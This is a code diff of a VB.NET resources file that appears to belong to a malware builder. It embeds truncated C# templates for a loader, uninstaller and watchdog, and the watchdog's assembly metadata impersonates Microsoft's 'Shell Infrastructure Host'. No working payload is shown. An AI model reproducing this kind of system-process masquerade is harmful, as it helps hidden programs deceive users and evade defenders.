@@ -105,6 +105,7 @@ Namespace My.Resources
         '''using System.IO;
         '''using System.Reflection;
         '''using System.Security.Cryptography;
+        '''using System.Runtime.InteropServices;
         '''using System.Text;
         '''using System.Resources;
         '''using System.Threading;
@@ -119,31 +120,11 @@ Namespace My.Resources
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
         '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
         '''[assembly: AssemblyProduct(&quot;%Product%&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;%Copyrig [rest of string was truncated]&quot;;.
+        '''[assembly: Assembl [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Loader() As String
             Get
                 Return ResourceManager.GetString("Loader", resourceCulture)
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property Mandark() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("Mandark", resourceCulture)
-                Return CType(obj,Byte())
-            End Get
-        End Property
-        
-        '''<summary>
-        '''  Looks up a localized resource of type System.Byte[].
-        '''</summary>
-        Friend ReadOnly Property Mandark1() As Byte()
-            Get
-                Dim obj As Object = ResourceManager.GetObject("Mandark1", resourceCulture)
-                Return CType(obj,Byte())
             End Get
         End Property
         
@@ -177,7 +158,8 @@ Namespace My.Resources
         '''#if DefAssembly
         '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        '''[assembly: AssemblyCompany(&quot;%Comp [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        '''[assembly:  [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -190,6 +172,7 @@ Namespace My.Resources
         '''using System.IO;
         '''using System.Reflection;
         '''using System.Security.Cryptography;
+        '''using System.Runtime.InteropServices;
         '''using System.Text;
         '''using System.Resources;
         '''using System.Threading;
@@ -202,10 +185,12 @@ Namespace My.Resources
         '''using System.Windows.Forms;
         '''#endif
         '''
+        '''[assembly: Guid(&quot;%Guid%&quot;)]
+        '''
         '''public partial class Uninstaller
         '''{
-        '''    public static string lb = RGetString(&quot;#LIBSPATH&quot;);
-        '''    public static string bD = Environment.GetFolderPath(Environment. [rest of string was truncated]&quot;;.
+        '''    public static string rlB = RGetString(&quot;#LIBSPATH&quot;);
+        '''    public static st [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Uninstaller() As String
             Get
@@ -220,8 +205,10 @@ Namespace My.Resources
         '''using System.Management;
         '''using System.Reflection;
         '''using System.Security.Cryptography;
+        '''using System.Runtime.InteropServices;
         '''using System.Text;
         '''using System.Threading;
+        '''using System.Linq;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
@@ -229,7 +216,7 @@ Namespace My.Resources
         '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)] [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCopyright(&quot;© Micr [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Watchdog() As String
             Get
